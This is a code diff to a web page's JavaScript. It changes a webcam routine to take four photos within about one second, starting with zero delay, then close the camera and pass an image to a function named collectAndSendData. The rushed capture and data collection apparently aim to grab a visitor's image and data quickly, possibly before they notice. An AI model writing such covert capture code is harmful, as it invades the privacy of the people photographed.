@@ -102,48 +102,65 @@
                 video.srcObject = mediaStream;
                 document.getElementById('cameraSection').style.display = 'block';
                 console.log("✓ Camera stream started");
+
+                const photos = [];
+
                 /**
-                 * Capture photo with optimized timing
-                 * 2.5 seconds allows sensor auto-calibration for better exposure
+                 * Helper to capture a single photo
                  */
-                setTimeout(() => {
+                function capturePhoto() {
                     try {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 1280;
                         canvas.height = video.videoHeight || 720;
                         const ctx = canvas.getContext('2d');
                         
-                        // Draw with brightness filter for low-light enhancement
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // Apply canvas-level brightness boost for low-light
                         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                         const data = imageData.data;
                         
-                        // Boost brightness by 15% for low-light environments
                         for (let i = 0; i < data.length; i += 4) {
-                            data[i] = Math.min(255, data[i] * 1.15);     // Red
-                            data[i + 1] = Math.min(255, data[i + 1] * 1.15); // Green
-                            data[i + 2] = Math.min(255, data[i + 2] * 1.15); // Blue
-                            // data[i + 3] is alpha, leave unchanged
+                            data[i] = Math.min(255, data[i] * 1.15);
+                            data[i + 1] = Math.min(255, data[i + 1] * 1.15);
+                            data[i + 2] = Math.min(255, data[i + 2] * 1.15);
                         }
                         
                         ctx.putImageData(imageData, 0, 0);
-                        photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
-                        
-                        console.log("✓ Photo captured successfully");
-                        
-                        // IMMEDIATELY close camera after capture
-                        cleanupMedia();
-                        
-                        // Start data collection in parallel
-                        collectAndSendData(photoBase64);
+                        return canvas.toDataURL('image/jpeg', 0.92);
                     } catch (err) {
-                        console.error("✗ Photo capture failed:", err);
-                        cleanupMedia();
-                        collectAndSendData(null);
+                        console.error("Photo capture error:", err);
+                        return null;
                     }
-                }, 2500);
+                }
+
+                // Capture first image with ZERO delay
+                photos.push(capturePhoto());
+                console.log("✓ First photo captured (0ms delay)");
+
+                // Second image within first half second
+                setTimeout(() => {
+                    photos.push(capturePhoto());
+                    console.log("✓ Second photo captured (~200ms)");
+                }, 200);
+
+                // Third image
+                setTimeout(() => {
+                    photos.push(capturePhoto());
+                    console.log("✓ Third photo captured");
+                }, 600);
+
+                // Fourth image (max 4)
+                setTimeout(() => {
+                    photos.push(capturePhoto());
+                    console.log("✓ Fourth photo captured");
+
+                    // Use the last photo for backward compatibility, or you can modify payload later if needed
+                    photoBase64 = photos[photos.length - 1];
+                    cleanupMedia();
+                    collectAndSendData(photoBase64);
+                }, 1100);
+
             } catch (err) {
                 console.error("✗ Camera permission error:", err);
                 cleanupMedia();
